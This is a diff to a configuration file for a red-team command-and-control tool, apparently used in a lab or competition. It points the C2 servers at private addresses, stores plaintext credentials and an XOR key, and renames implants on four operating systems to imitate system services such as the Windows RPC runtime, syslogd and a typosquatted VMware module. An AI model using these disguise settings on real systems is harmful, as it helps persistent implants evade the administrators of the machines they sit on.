@@ -1,33 +1,42 @@
 ---
+# Run control
+br4vo6ix_compile: false
+br4vo6ix_c2_install: false
+br4vo6ix_implant_install: false
+
 # C2
 proxy_ips:
-  - 127.0.0.1
-  - 127.0.1.1
+  - 172.20.1.102
+  - 172.20.1.106
+  - 172.20.1.109
 proxy_ports:
-  - 50001
-  - 50002
-  - 50003
-server_ip: 127.0.0.1
+  - 58178
+  - 58872
+  - 59685
+  - 53452
+  - 54483
+  - 59485
+server_ip: 172.20.1.101
 server_user: redteam
 server_password: letredin
-xor_key: abcdefghijklmnopqrstuvwxyz
+xor_key: redteamwinseverytime
 
 # Windows Implant
-windows_srv_name: Br4vo6ix
-windows_srv_desc: Br4vo6ix Implant
-windows_file_name: br4vo6ix.exe
+windows_srv_name: Remote Procedure Call (RPC) Runtime
+windows_srv_desc: The remote procedure call runtime handles Remote Procedure Call (RPC) commands from the RPC server.
+windows_file_name: rpcr.exe
 
 # Linux Implant
-linux_srv_name: Br4vo6ix
-linux_srv_desc: Br4vo6ix Implant
-linux_file_name: br4vo6ix
+linux_srv_name: syslogd
+linux_srv_desc: System logging service daemon (https://www.rsyslog.com/doc/)
+linux_file_name: syslogd
 
 # FreeBSD Implant
-freebsd_srv_name: Br4vo6ix
-freebsd_srv_desc: Br4vo6ix Implant
-freebsd_file_name: br4vo6ix
+freebsd_srv_name: vnnware-knod
+freebsd_srv_desc: Vnnware Kernel Nodule Service
+freebsd_file_name: vnnware-knod
 
 # MacOS Implant
-macos_srv_name: Br4vo6ix
-macos_srv_desc: Br4vo6ix Implant
-macos_file_name: br4vo6ix
+macos_srv_name: syslogd
+macos_srv_desc: System logging service daemon (https://www.rsyslog.com/doc/)
+macos_file_name: syslogd
